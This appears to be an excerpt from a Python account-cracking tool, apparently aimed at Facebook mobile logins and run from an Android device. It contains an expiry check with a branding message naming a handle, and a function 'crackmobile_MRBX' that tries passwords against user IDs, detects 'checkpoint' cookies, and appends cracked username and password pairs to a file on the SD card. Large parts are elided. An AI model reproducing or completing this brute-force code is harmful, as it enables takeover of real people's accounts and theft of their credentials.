...
g= datetime.datetime(2023, 11, 28, 8, 00 ,0)

if (x.strftime("%x"))>(g.strftime("%x")):
 print('\n\n')
 print("    "+ 'WARING THE TOOL CODEING BY CODER 777\nTOOL EXPIERE BRO⛔\nBO KRINI TOOL NAMA BNERA BO @reba777')
 print('\n\n')
 print(x)
...
def crackmobile_MRBX(idf,pwv,nmf):
    ...
    'user-agent': ua,
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r{K}\n[-CP]\n[✘] User : {idf}\n[✘] Pass : {pw}{N}')
                open('/sdcard/REBA-CPk.txt','a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                break
